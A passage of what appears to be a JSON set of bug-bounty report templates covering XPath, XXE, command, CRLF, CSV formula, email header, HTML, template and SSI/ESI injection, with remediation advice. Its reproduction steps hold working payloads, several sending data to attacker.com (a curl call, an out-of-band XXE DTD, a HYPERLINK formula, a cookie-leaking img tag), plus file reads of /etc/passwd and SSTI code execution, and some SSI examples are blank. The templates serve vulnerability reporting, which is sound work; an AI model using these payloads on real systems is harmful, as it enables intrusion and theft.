          "   a. In a login form, for the username, enter an XPath injection payload like `admin' or '1'='1` (assuming the XPath query looks something like `//users/user[username='user_input' and password='pass_input']`).",
          "   b. For the password, enter any value or another bypass payload.",
          "   c. **[What happened]**: The application logs you in as an arbitrary user, often the first user in the XML document (e.g., 'admin').",
          "   d. **[What should happen]**: Authentication should fail for invalid credentials.",
          "3. **[Scenario B: Information Disclosure]**",
          "   a. In a search parameter, try injecting XPath to broaden the search or extract specific nodes (e.g., `product=apple' or 1=1 or ''='` or `product=banana'|//user/creditCardNumber|'`).",
          "   b. **[What happened]**: The application returns more data than intended, potentially sensitive information from the XML document.",
          "   c. **[What should happen]**: The application should only return information based on strict search criteria and authorized access.",
          "4. **[Scenario C: Blind XPath Injection]**",
          "   a. If the application doesn't display errors, use boolean-based or time-based techniques (similar to blind SQLi) by injecting XPath predicates that evaluate to true/false or cause delays (e.g., `product=apple' and substring(name(),1,1)='a'` or `product=apple' and 'a'='b' or 1=count(./*)*0+1 and (if(1=1) then concat('a','b') else 'a') and sleep(5)`).",
          "   b. **[What happened]**: The application's response (page content, HTTP status, or timing) differs, allowing inference of data."
        ],
        "proof_of_concept": {
          "request_example": "POST /login HTTP/1.1\nHost: data.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27%20or%20%271%27%3D%271&password=anypassword",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
          "notes": "Provide HTTP request/response pairs demonstrating the successful bypass or information disclosure. Include screenshots of successful login or unexpected XML data returned."
        },
        "impact": "Authentication bypass leading to account takeover. Unauthorized access to sensitive data stored within XML documents (e.g., user credentials, configuration data). Can potentially lead to data manipulation or system compromise if the XPath query is used for updates or related to external system calls.",
        "remediation_suggestion": "Use safe XPath API methods that treat user input as literal values and do not allow arbitrary XPath syntax. Implement strict input validation and whitelist acceptable characters and patterns for fields used in XPath queries. Avoid dynamically constructing XPath queries using unsanitized user input."
      },
      {
        "vulnerability_name": "XML External Entity (XXE)",
        "summary": "XML External Entity (XXE) vulnerabilities occur when an XML parser processes XML input containing a reference to an external entity, without proper validation or sanitization. This can lead to information disclosure, server-side request forgery (SSRF), port scanning, or remote code execution.",
        "severity": "High",
        "target": "[Specify affected asset, e.g., api.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint that processes XML, e.g., https://api.example.com/upload_config]",
        "steps_to_reproduce": [
          "1. Identify an endpoint that accepts XML input (e.g., SOAP requests, XML file uploads, API endpoints expecting XML payloads).",
          "2. **[Scenario A: Out-of-Band (OOB) XXE for file read]**",
          "   a. Construct an XML payload with a DTD (Document Type Definition) that defines an external entity pointing to a local file (e.g., `/etc/passwd`) and an external attacker-controlled URL (e.g., `http://attacker.com/oob_data`).",
          "   b. Example payload:",
          "     ```xml\n     <!DOCTYPE foo [\n       <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n       <!ENTITY % ext SYSTEM \"[http://attacker.com/evil.dtd](http://attacker.com/evil.dtd)\">\n       %ext;\n       %p1;\n     ]>\n     <data>&xxe;</data>\n     ```\n     And the `evil.dtd` on attacker.com:\n     ```xml\n     <!ENTITY % p1 \"<!ENTITY &#x25; p2 SYSTEM '[http://attacker.com/?%xxe](http://attacker.com/?%xxe);'>\">\n     ```",
          "   c. Send this XML payload to the vulnerable endpoint.",
          "   d. **[What happened]**: Observe a request to your attacker-controlled server containing the contents of `/etc/passwd` in the URL query string, confirming the file read.",
          "   e. **[What should happen]**: The XML parser should be configured to disable external entity processing.",
          "3. **[Scenario B: SSRF via XXE]**",
          "   a. Modify the external entity declaration to point to an internal resource (e.g., `http://localhost/admin` or `http://169.254.169.254/latest/meta-data/`).",
          "   b. Example payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/admin\">]>\n<data>&xxe;</data>`",
          "   c. Send this XML payload.",
          "   d. **[What happened]**: The application's response (or an error message) reveals content from the internal resource, or a request is made to the internal resource.",
          "4. **[Scenario C: Blind XXE (error-based)]**",
          "   a. Use a DTD that attempts to load a non-existent file or perform an invalid operation to trigger an error message containing system information.",
          "   b. Example payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///nonexistent\">]>\n<data>&xxe;</data>`",
          "   c. **[What happened]**: The application returns a verbose error message indicating the file access attempt or system path."
        ],
        "proof_of_concept": {
          "request_example": "POST /upload_config HTTP/1.1\nHost: api.example.com\nContent-Type: application/xml\n\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\">\n  %ext;\n  %p1;\n]>\n<data>&xxe;</data>",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...",
          "notes": "Provide the XML payload, the attacker server logs (if applicable), and screenshots of the application's response showing the file contents or error messages."
        },
        "impact": "Information disclosure (reading arbitrary files from the server, including sensitive configuration files, source code, credentials). Server-Side Request Forgery (SSRF) to internal or external systems. Denial of Service (DoS) by exploiting infinite recursion or large file inclusion. Potential for remote code execution in specific configurations (e.g., PHP expect protocol, Java JAR files).",
        "remediation_suggestion": "Disable DTD processing in the XML parser configuration if not strictly required. If DTDs are necessary, configure the parser to explicitly disable external entity resolution (e.g., `DTDLoad`, `ExternalDTD`). Use less complex data formats like JSON instead of XML where possible. Implement strict input validation for all XML inputs. Upgrade XML parsers to versions that mitigate XXE vulnerabilities."
      },
      {
        "vulnerability_name": "Command Injection",
        "summary": "Command Injection allows an attacker to execute arbitrary operating system commands on the server running an application, typically by injecting commands through user-supplied input that is executed without proper sanitization.",
        "severity": "Critical",
        "target": "[Specify affected asset, e.g., admin.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://admin.example.com/tools/ping?ip=]",
        "steps_to_reproduce": [
          "1. Identify an input field or URL parameter that is likely passed to a system command (e.g., `ping`, `nslookup`, `exec`, `shell_exec` in backend code). Common parameters include `ip`, `filename`, `path`, `host`.",
          "2. **[Scenario A: Basic Command Injection]**",
          "   a. In the vulnerable parameter, append command injection characters followed by an OS command (e.g., `;`, `|`, `&`, `&&`, `||`, `\n`).",
          "   b. Example payload: `ip=127.0.0.1;id` or `filename=test.txt|ls -la`.",
          "   c. **[What happened]**: The output of the injected command (`id`, `ls -la`) is returned in the application's response, confirming execution.",
          "   d. **[What should happen]**: The input should be strictly sanitized or validated, and the command should not be executed.",
          "3. **[Scenario B: Blind Command Injection (Out-of-Band)]**",
          "   a. If command output is not returned, try injecting commands that cause an out-of-band interaction (e.g., DNS lookup, HTTP request to attacker-controlled server).",
          "   b. Example payload: `ip=127.0.0.1;nslookup $(whoami).attacker.com` or `ip=127.0.0.1;curl http://attacker.com/$(whoami)`.",
          "   c. **[What happened]**: Observe a DNS lookup or HTTP request on your attacker-controlled server, revealing information (e.g., `whoami` output) and confirming blind execution.",
          "   d. **[What should happen]**: No out-of-band requests should be triggered by malicious input.",
          "4. **[Scenario C: Different OS payloads]**",
          "   a. Test various operating system commands appropriate for Linux (`ls`, `cat /etc/passwd`, `id`) and Windows (`dir`, `type C:\\Windows\\win.ini`, `whoami`).",
          "   b. **[What happened]**: Commands for the server's operating system execute successfully."
        ],
        "proof_of_concept": {
          "request_example": "GET /tools/ping?ip=127.0.0.1%3Bid HTTP/1.1\nHost: admin.example.com",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
          "notes": "Provide HTTP request/response pairs clearly showing the injected command's output. For blind injections, provide attacker server logs (DNS/HTTP) confirming interaction. Include screenshots of the application's response."
        },
        "impact": "Remote Code Execution (RCE) on the server, leading to complete system compromise. This allows attackers to execute arbitrary commands, access sensitive files, install malware, pivot to other internal systems, and potentially gain full control over the affected server.",
        "remediation_suggestion": "Avoid executing OS commands directly with user-supplied input. If absolutely necessary, use robust input validation (whitelisting acceptable input). Use API calls or built-in functions that do not invoke the shell. If shell commands are unavoidable, use strict parameterization and careful escaping of all user input before it is passed to the command."
      },
      {
        "vulnerability_name": "CRLF Injection",
        "summary": "CRLF (Carriage Return Line Feed) Injection allows an attacker to inject CRLF characters (\\r\\n or %0d%0a) into HTTP headers or other contexts. This can lead to HTTP Response Splitting, HTTP Header Injection, or Log Injection, potentially enabling XSS, cache poisoning, or session hijacking.",
        "severity": "Medium",
        "target": "[Specify affected asset, e.g., web.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, typically in a URL parameter that's reflected in a header, e.g., https://web.example.com/redirect?url=]",
        "steps_to_reproduce": [
          "1. Identify an input field or URL parameter whose value is reflected in an HTTP response header (e.g., `Location` header in redirects, `Set-Cookie` header, custom headers).",
          "2. **[Scenario A: HTTP Response Splitting (Redirect)]**",
          "   a. Navigate to a redirect endpoint (e.g., `/redirect?url=`).",
          "   b. Inject CRLF characters followed by a new HTTP header and potentially a new body. Example: `url=http://example.com%0d%0aSet-Cookie:crlf_cookie=injected%0d%0a%0d%0a<script>alert(document.domain)</script>`",
          "   c. **[What happened]**: The server's response includes the injected header and/or a new response body, potentially leading to XSS or cache poisoning.",
          "   d. **[What should happen]**: The server should strip CRLF characters or encode them before reflecting in headers.",
          "3. **[Scenario B: HTTP Header Injection (Non-Redirect)]**",
          "   a. Identify a parameter reflected in any HTTP response header (e.g., `Content-Disposition`, `X-Forwarded-For`).",
          "   b. Inject CRLF followed by a malicious header. Example: `filename=report.txt%0d%0aX-Injected-Header:test`",
          "   c. **[What happened]**: The server's response includes the injected custom header, allowing an attacker to bypass security mechanisms or trick clients.",
          "   d. **[What should happen]**: Input should be properly sanitized or validated for header reflection.",
          "4. **[Scenario C: Log Injection]**",
          "   a. Identify an input field whose value is logged directly without sanitization (e.g., username in a failed login attempt).",
          "   b. Inject CRLF characters followed by false log entries. Example: `username=admin%0d%0aERROR: User attacker logged in from 1.2.3.4`.",
          "   c. **[What happened]**: The server's log files contain the injected, misleading entries, potentially hindering incident response or forensic analysis.",
          "   d. **[What should happen]**: All inputs logged should be sanitized to remove CRLF characters."
        ],
        "proof_of_concept": {
          "request_example": "GET /redirect?url=http://example.com%0d%0aSet-Cookie:crlf_cookie=injected%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: web.example.com",
          "response_example": "HTTP/1.1 302 Found\nLocation: http://example.com\nSet-Cookie: crlf_cookie=injected\n\n<script>alert(document.domain)</script>\n",
          "notes": "Provide HTTP request/response pairs demonstrating the injected headers/content. Include browser screenshots showing script execution or network tab showing the modified response."
        },
        "impact": "HTTP Response Splitting can lead to various attacks, including: Web Cache Poisoning (poisoning shared caches with malicious content for other users), Cross-Site Scripting (XSS) in vulnerable browsers/proxies, HTTP Session Hijacking (injecting session cookies), and Web Defacement. Log Injection can mask attacker activity or make forensic analysis difficult.",
        "remediation_suggestion": "Strictly filter or encode CRLF characters (`%0d%0a`) from all user-supplied input before it is used in HTTP headers, log files, or any other context where newlines could lead to logical separation. Whitelist acceptable characters and patterns for inputs used in headers."
      },
      {
        "vulnerability_name": "Formula Injection (CSV Injection)",
        "summary": "Formula Injection (also known as CSV Injection) occurs when an application exports user-supplied data to a CSV (Comma Separated Values) file without proper sanitization. Malicious formulas embedded in the data can be executed when the CSV file is opened in spreadsheet software like Microsoft Excel or LibreOffice Calc.",
        "severity": "Medium",
        "target": "[Specify affected asset, e.g., reports.example.com]",
        "url_location": "[Full URL of the feature that exports data to CSV, e.g., https://reports.example.com/export_users]",
        "steps_to_reproduce": [
          "1. Identify a feature that allows users to input data which is later exported to a CSV file (e.g., user profile fields, comments, messaging, database records).",
          "2. **[Scenario A: Basic Formula Execution]**",
          "   a. Input a simple formula that confirms execution into a field that will be exported. Example: `='1+1'` or `=1+1` (some software auto-converts, others need the leading quote).",
          "   b. Export the data to a CSV file.",
          "   c. Open the CSV file in spreadsheet software (e.g., Excel).",
          "   d. **[What happened]**: The cell displays `2` instead of `=1+1`, indicating formula execution.",
          "   e. **[What should happen]**: The cell should display the literal string `='1+1'` or `=1+1` without execution.",
          "3. **[Scenario B: External Command Execution (DDE/Macro)]**",
          "   a. Input a malicious formula that triggers external command execution via DDE (Dynamic Data Exchange) or macros (if macros are enabled and not restricted).",
          "   b. Export the data and open the CSV.",
          "   c. **[What happened]**: The calculator (or other command) pops up, demonstrating arbitrary command execution on the victim's machine.",
          "   d. **[What should happen]**: Formulas should not be executed.",
          "4. **[Scenario C: Data Exfiltration]**",
          "   a. Input a formula that attempts to exfiltrate data (e.g., cell content, system info) to an attacker-controlled server. Example: `=HYPERLINK(\"http://attacker.com?data=\"&A1)` (where A1 is a sensitive cell).",
          "   b. **[What happened]**: When the victim opens the CSV, their spreadsheet software makes a request to the attacker's server, leaking data."
        ],
        "proof_of_concept": {
          "input_example": "Product Name: `=1+1`\nUser Comment: `='evil data'`",
          "csv_output_example": "Product Name,=1+1\nUser Comment,='evil data'",
          "notes": "Provide screenshots of the input fields, the exported CSV content (showing the formula as a string), and a screenshot of the spreadsheet software displaying the executed formula result or the pop-up (e.g., calculator for DDE). For data exfiltration, include attacker server logs."
        },
        "impact": "Remote Code Execution (RCE) on the victim's machine (if DDE or macros are enabled), data exfiltration from the victim's spreadsheet, phishing attacks, or manipulation of spreadsheet content. This is a client-side vulnerability that can severely impact users who download and open affected CSV files.",
        "remediation_suggestion": "Sanitize all user-supplied input before exporting to CSV by prepending a single quote (`'`) to any cell that starts with a formula delimiter (`=`, `+`, `-`, `@`). Alternatively, ensure that the application explicitly escapes all input to prevent formula recognition by spreadsheet software."
      },
      {
        "vulnerability_name": "Email Header Injection",
        "summary": "Email Header Injection allows an attacker to inject arbitrary email headers (e.g., `Bcc`, `Subject`, `Content-Type`) into an email sent by the application, typically by injecting CRLF characters into user-supplied input that is used in the email's headers.",
        "severity": "Medium",
        "target": "[Specify affected asset, e.g., mail.example.com]",
        "url_location": "[Full URL of the endpoint that sends emails, e.g., https://mail.example.com/contact_us, https://mail.example.com/invite_friend]",
        "steps_to_reproduce": [
          "1. Identify an input field that is used to generate an email (e.g., 'Contact Us' form, 'Invite a Friend' feature where you enter an email and message, email notification settings where subject/body can be customized).",
          "2. **[Scenario A: Bcc Injection (Mass Mail)]**",
          "   a. In the 'email' or 'message' field, inject CRLF characters followed by a `Bcc` header and a list of target emails. Example: `victim@example.com%0d%0aBcc:attacker1@example.com,attacker2@example.com`.",
          "   b. Submit the form.",
          "   c. **[What happened]**: An email is sent to `victim@example.com` AND to the `Bcc` addresses (attacker-controlled emails), without the `Bcc` being visible to the original recipient. This confirms the ability to send mass spam/phishing.",
          "   d. **[What should happen]**: The application should strip CRLF characters from input used in email headers.",
          "3. **[Scenario B: Subject Line Spoofing / Header Overwrite]**",
          "   a. In an input field that affects the email subject or body, inject CRLF followed by a new `Subject` header, or other headers like `From`, `To`.",
          "   b. Example: `user@example.com%0d%0aSubject:Urgent Action Required - Account Security`.",
          "   c. **[What happened]**: The sent email has the forged subject line or other headers, making it appear legitimate and enabling phishing.",
          "   d. **[What should happen]**: Input for headers should be properly escaped and validated.",
          "4. **[Scenario C: Content-Type Alteration (XSS in Mail Client)]**",
          "   a. Inject CRLF followed by a `Content-Type: text/html` header and an HTML payload in the email body.",
          "   b. Example: `victim@example.com%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>XSS Test</h1><script>alert(document.domain)</script>`.",
          "   c. **[What happened]**: The email client renders the HTML and executes the script, leading to XSS in the mail client.",
          "   d. **[What should happen]**: Email content type should be fixed or strictly validated."
        ],
        "proof_of_concept": {
          "input_example": "Email field: `victim@example.com%0d%0aBcc:attacker@example.com`\nMessage field: `Hello`",
          "sent_email_headers_example": "To: victim@example.com\nBcc: attacker@example.com\nSubject: Original Subject\n\nHello",
          "notes": "Provide screenshots of the input form, and if possible, screenshots of the received email showing the injected headers or the email arriving at unexpected recipients (attacker's inbox). Include original HTTP request and response if applicable."
        },
        "impact": "Mass spamming, phishing attacks (leveraging the legitimate domain), email spoofing, and potential for XSS in email clients. This can severely damage the organization's reputation and lead to widespread user compromise.",
        "remediation_suggestion": "Sanitize all user-supplied input by removing or encoding CRLF characters (`%0d%0a`) before concatenating them into email headers. Use dedicated API functions for setting email headers instead of string concatenation. Implement strict validation and whitelisting for all email-related inputs."
      },
      {
        "vulnerability_name": "HTML Injection",
        "summary": "HTML Injection allows an attacker to inject arbitrary HTML code into a web page, typically through user-supplied input that is reflected on the page without proper sanitization. This can lead to defacement, phishing, or information disclosure.",
        "severity": "Low",
        "target": "[Specify affected asset, e.g., forum.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://forum.example.com/posts/view?id=123]",
        "steps_to_reproduce": [
          "1. Identify an input field where user-supplied data is reflected on a web page (e.g., username, comment, profile description, search results).",
          "2. **[Scenario A: Basic HTML Injection]**",
          "   a. Input a simple HTML tag like `<b>injected text</b>` or `<h1>Hello</h1>` into the vulnerable field.",
          "   b. Submit the input and observe where it's reflected on the page.",
          "   c. **[What happened]**: The injected HTML is rendered by the browser, showing 'injected text' in bold or 'Hello' as a heading.",
          "   d. **[What should happen]**: The HTML tags should be escaped or stripped, displaying `<b>injected text</b>` literally.",
          "3. **[Scenario B: Phishing/Defacement]**",
          "   a. Inject more complex HTML, such as a fake login form or an `<img>` tag with an external source to leak data. Example: `<img src=\"http://attacker.com/log?cookie=\"+document.cookie>`.",
          "   b. **[What happened]**: The malicious HTML is rendered, potentially creating a convincing phishing page within the legitimate site or defacing the content.",
          "   c. **[What should happen]**: HTML rendering should be controlled and sanitized.",
          "4. **[Scenario C: HTML Injection Leading to CSS/JS Interaction (Less Common for pure HTMLI)]**",
          "   a. Attempt to inject HTML that interacts with existing CSS or JavaScript (e.g., using specific class names or IDs that the application already uses).",
          "   b. **[What happened]**: The injected HTML elements manipulate the page's appearance or behavior in unintended ways."
        ],
        "proof_of_concept": {
          "input_example": "Comment: `<b>This comment is bold.</b>`",
          "rendered_output_example": "The webpage displays: **This comment is bold.**",
          "notes": "Provide screenshots of the input field and the rendered HTML on the web page, clearly showing the injected HTML being executed. Include the HTTP request and response if it's reflected in a header."
        },
        "impact": "Website defacement, leading to reputational damage. Phishing attacks, where attackers create fake login forms or misleading content within the legitimate domain to trick users. Information disclosure (e.g., via image tags attempting to load external resources with sensitive query parameters). Can sometimes be escalated to XSS if attributes are not properly handled.",
        "remediation_suggestion": "Implement proper output encoding for all user-supplied data that is reflected on the web page. Use context-sensitive encoding (e.g., HTML entity encoding for data placed within HTML elements). Avoid embedding raw user input directly into HTML. Consider using a secure templating engine that automatically escapes output."
      },
      {
        "vulnerability_name": "Dangling Markup",
        "summary": "Dangling Markup Injection is a type of client-side injection where an attacker injects incomplete HTML or JavaScript tags into a page. These incomplete tags 'dangle' and capture sensitive information that appears later on the page, exfiltrating it to an attacker-controlled server.",
        "severity": "Medium",
        "target": "[Specify affected asset, e.g., shopping.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://shopping.example.com/profile]",
        "steps_to_reproduce": [
          "1. Identify a reflected input field or a stored input that appears on a page which also contains sensitive user data later in the HTML (e.g., username, profile description on a page that also shows credit card details or session tokens).",
          "2. **[Scenario A: Basic Data Exfiltration]**",
          "   a. Input an incomplete HTML tag that acts as a 'data sink'. Example: `<img src=\"http://attacker.com/log?q=`.",
          "   b. Submit this input.",
          "   c. **[What happened]**: When the page loads, the browser interprets the `src` attribute of the `<img>` tag to extend until the next `\"` (double quote) or `>` character it encounters. If sensitive data (like a CSRF token or credit card number) follows the injected string and is enclosed in quotes, it will be captured as part of the `src` URL and sent to `attacker.com`.",
          "   d. **[What should happen]**: All reflected input should be properly encoded or sanitized to prevent partial tag creation.",
          "   e. Observe your attacker-controlled server's access logs for requests containing the sensitive data.",
          "3. **[Scenario B: Exfiltrating from a hidden input]**",
          "   a. If there's a hidden input field with sensitive data (e.g., `<input type=\"hidden\" name=\"csrf_token\" value=\"[TOKEN]\">`), try injecting `<form action=\"http://attacker.com/steal\" method=\"POST\">` before it, and then `\"` to close the value attribute.",
          "   b. **[What happened]**: The browser may continue parsing the form within the attacker's context, potentially submitting the hidden input's value to the attacker's server.",
          "   c. **[What should happen]**: All input should be properly sanitized, and sensitive data should not be placed in hidden inputs if it can be chained with other client-side vulnerabilities."
        ],
        "proof_of_concept": {
          "input_example": "Username field: `<img src=\"http://attacker.com/log?data=`",
          "victim_page_html": "\n<p>Username: <span class=\"user_input\"><img src=\"http://attacker.com/log?data=\"</span></p>\n\n<input type=\"hidden\" id=\"csrf_token\" value=\"SECURE_CSRF_TOKEN_12345\">",
          "attacker_log_example": "GET /log?data=SECURE_CSRF_TOKEN_12345%22%3E%3C/p%3E%3C!-- HTTP/1.1",
          "notes": "Provide the exact injected payload, the relevant portion of the page's HTML source (if discoverable), and attacker server logs showing the exfiltrated data. Include screenshots or a video if possible."
        },
        "impact": "Sensitive data exfiltration (e.g., CSRF tokens, session IDs, personal identifiable information, credit card numbers, secret keys) to an attacker-controlled server. This can lead to session hijacking, account takeover, or severe privacy breaches.",
        "remediation_suggestion": "Implement robust context-sensitive output encoding for all user-supplied data, ensuring that quotes and angle brackets are properly escaped. Avoid reflecting user-supplied data in contexts where it could create incomplete HTML tags. If sensitive data must be on the page, consider using methods that prevent it from being included in such 'dangling' contexts."
      },
      {
        "vulnerability_name": "Client Side Template Injection",
        "summary": "Client-Side Template Injection occurs when an attacker can inject malicious code into a web page that uses a client-side template engine (e.g., AngularJS, Handlebars.js, Vue.js, React). The template engine then processes and executes this injected code, leading to client-side code execution.",
        "severity": "High",
        "target": "[Specify affected asset, e.g., portal.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://portal.example.com/profile]",
        "steps_to_reproduce": [
          "1. Identify a web application that uses a client-side template engine and reflects user input (e.g., in a username, profile field, comments, search results, or in a client-side script that dynamically populates templates).",
          "2. **[Scenario A: AngularJS SSTI]**",
          "   a. If AngularJS is used, try injecting AngularJS expressions. Example: `{{2*2}}` or `{{$eval('alert(document.domain)')}}`.",
          "   b. **[What happened]**: The application renders `4` or executes the JavaScript `alert` box, indicating successful template injection.",
          "   c. **[What should happen]**: The template engine should not execute arbitrary expressions from user input.",
          "3. **[Scenario B: Generic Client-Side Template Execution]**",
          "   a. Depending on the template engine, try injecting its specific syntax. Example for Handlebars.js: `{{#with \"\" as |x|}}{{x.constructor.constructor('alert(document.domain)')()}}{{/with}}` (requires `allowProtoPropertiesByDefault` or similar config).",
          "   b. **[What happened]**: The injected code executes, leading to an `alert` box or other client-side action.",
          "   c. **[What should happen]**: Template engines should escape or sandbox user input.",
          "4. **[Scenario C: Leveraging Existing Template Context]**",
          "   a. Observe if the application exposes any objects or functions to the template context (e.g., `user`, `config`).",
          "   b. Try to inject code that interacts with these objects to access sensitive information or trigger unintended behavior (e.g., `{{user.isAdmin}}` or `{{config.apiKey}}`)."
        ],
        "proof_of_concept": {
          "input_example": "Comment field: `{{constructor.constructor('alert(document.domain)')()}}` (AngularJS)",
          "rendered_output_example": "The browser displays an `alert` box with `document.domain`.",
          "notes": "Provide screenshots of the input field and the resulting execution (e.g., alert box). Include the HTTP request and response if the input is reflected via server-side processing."
        },
        "impact": "Cross-Site Scripting (XSS), allowing attackers to execute arbitrary JavaScript in the victim's browser, leading to session hijacking, defacement, sensitive data theft, and phishing. Depending on the template engine's capabilities and context, it can potentially lead to more severe client-side attacks.",
        "remediation_suggestion": "Ensure all user-supplied input is properly escaped before being processed by a client-side template engine. Use template engines in a secure mode that prevents execution of arbitrary code (e.g., using a sandboxed environment). Avoid interpolating untrusted input directly into templates. Use context-aware encoding."
      },
      {
        "vulnerability_name": "Server Side Template Injection (SSTI)",
        "summary": "Server-Side Template Injection (SSTI) occurs when an attacker can inject malicious code into a template that is processed on the server-side (e.g., Twig, Jinja2, Thymeleaf, Velocity, Freemarker). This can lead to remote code execution (RCE) on the server.",
        "severity": "Critical",
        "target": "[Specify affected asset, e.g., web.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://web.example.com/render?name=]",
        "steps_to_reproduce": [
          "1. Identify an input field or URL parameter where user-supplied data is directly embedded into a server-side template (e.g., `name` in a personalized greeting, email subject, comment field).",
          "2. **[Scenario A: Basic Code Execution Discovery]**",
          "   a. Attempt to inject a basic template expression that evaluates arithmetic or a simple function. Example: `{{7*7}}` (Jinja2/Twig), `${7*7}` (Freemarker/Velocity), `#{7*7}` (Thymeleaf).",
          "   b. **[What happened]**: The application renders `49` (or the result of the expression), confirming that the input is being processed by a template engine.",
          "   c. **[What should happen]**: The input should be escaped or treated as literal text.",
          "3. **[Scenario B: Remote Code Execution (RCE)]**",
          "   a. Research common SSTI payloads for the identified template engine and its underlying language (e.g., Python for Jinja2, Java for Freemarker). These often involve accessing global objects or executing methods.",
          "   b. Example (Jinja2/Python): `{{ ''.__class__.__mro__[2].__subclasses__()[40]('id').read() }}` (This is a complex payload to get `id` output).",
          "   c. Example (Twig/PHP): `{{_self.env.filterConfig.set('raw', 'system')}}` (requires chaining with a filter that uses `raw`).",
          "   d. Send the crafted payload.",
          "   e. **[What happened]**: The injected code executes on the server, and the output (e.g., `id` command output, file contents) is returned in the response, confirming RCE.",
          "   f. **[What should happen]**: The template engine should be sandboxed or input strictly sanitized to prevent code execution.",
          "4. **[Scenario C: File Read]**",
          "   a. Inject a payload to read arbitrary files. Example: `{{ config.items() }}` (Jinja2 for configuration, or `{{ file_loader.get_source(env, '../../../../etc/passwd') }}` for some engines)."
        ],
        "proof_of_concept": {
          "request_example": "GET /render?name=%7B%7B7*7%7D%7D HTTP/1.1\nHost: web.example.com",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\nHello 49!",
          "notes": "Provide the exact input payload, the HTTP request/response clearly showing the interpreted output or command execution. Screenshots of the web page rendering the result."
        },
        "impact": "Remote Code Execution (RCE) on the web server, leading to complete system compromise. An attacker can execute arbitrary commands, read/write files, access sensitive data, install malware, and gain full control over the server and potentially the entire infrastructure.",
        "remediation_suggestion": "Never allow user-supplied input to be directly interpolated into server-side templates without strict sanitization. Implement context-aware escaping for all user input before it reaches the template engine. Use sandboxed template engines that prevent access to dangerous functions or objects. Consider using a secure templating solution that is designed to prevent SSTI."
      },
      {
        "vulnerability_name": "Server Side Inclusion/Edge Side Inclusion (SSI/ESI)",
        "summary": "Server-Side Includes (SSI) or Edge Side Includes (ESI) Injection allows an attacker to inject directives that are processed and executed by the web server (e.g., Apache, Nginx) or a caching proxy. This can lead to information disclosure, arbitrary file reading, or even remote code execution.",
        "severity": "High",
        "target": "[Specify affected asset, e.g., cdn.example.com or web.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://web.example.com/page?name= or any reflected input]",
        "steps_to_reproduce": [
          "1. Identify an input field or URL parameter where user-supplied data is reflected directly into the HTML response, without encoding, on a server configured to process SSI/ESI directives (e.g., `name` in a personalized greeting, comment field).",
          "2. **[Scenario A: Basic SSI/ESI Information Disclosure]**",
          "   a. Inject a simple SSI directive to include a local file. Example (SSI): `` or ``.",
          "   b. Example (ESI): `<esi:include src=\"/etc/passwd\"/>` or `<esi:eval>alert(1)</esi:eval>`.",
          "   c. **[What happened]**: The application response includes the content of `/etc/passwd` or the output of `ls /`, confirming file reading/command execution via SSI/ESI.",
          "   d. **[What should happen]**: The server should encode or strip SSI/ESI directives from user input.",
          "3. **[Scenario B: SSI/ESI for Remote Code Execution (if `exec` is enabled)]**",
          "   a. If the server has the `exec` directive enabled (common with Apache `mod_include`), inject a command. Example: ``.",
          "   b. **[What happened]**: The command `id` is executed on the server, and its output is reflected in the HTTP response.",
          "   c. **[What should happen]**: The `exec` directive should be disabled, and user input should be thoroughly sanitized."
        ],
        "proof_of_concept": {
          "request_example": "GET /page?name=HTTP/1.1\nHost: web.example.com",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body>Hello\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\n</body></html>",
          "notes": "Provide the exact injected payload, the HTTP request/response clearly showing the included file content or command output. Screenshots of the web page rendering the result."
        },
        "impact": "Information disclosure (reading arbitrary files like `/etc/passwd`, configuration files, source code). Remote Code Execution (RCE) on the server if `exec` directives are enabled. Can lead to server compromise, sensitive data exposure, and further internal network attacks.",
        "remediation_suggestion": "Disable SSI/ESI processing for any pages that reflect user-supplied input. If SSI/ESI is necessary, ensure that all user-supplied input is robustly encoded or stripped of SSI/ESI directives before being reflected on the page. Specifically, disable the `exec` directive in SSI configurations if it's not absolutely essential."
      },
          {
            "vulnerability_name": "XSLT Server Side Injection",
            "summary": "XSLT (Extensible Stylesheet Language Transformations) Server-Side Injection occurs when an application processes untrusted XML input along with an XSLT stylesheet, and the attacker can inject malicious XSLT instructions. This can lead to information disclosure, arbitrary file reading, or remote code execution on the server.",
            "severity": "Critical",
            "target": "[Specify affected asset, e.g., api.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint that processes XML with XSLT, e.g., https://api.example.com/transform_data]",
            "steps_to_reproduce": [
              "1. Identify an endpoint that accepts XML input and likely processes it using an XSLT stylesheet (e.g., data transformation, report generation from XML).",
              "2. **[Scenario A: Basic Information Disclosure (File Read)]**",
              "   a. Craft a malicious XML input containing XSLT instructions to read a local file. Example (assuming `document()` function is enabled):",
              "     ```xml\n     <root xmlns:xsl=\"[http://www.w3.org/1999/XSL/Transform](http://www.w3.org/1999/XSL/Transform)\" xsl:version=\"1.0\">\n       <xsl:output method=\"text\"/>\n       <xsl:template match=\"/\">\n         <xsl:value-of select=\"document('file:///etc/passwd')\"/>\n       </xsl:template>\n     </root>\n     ```",
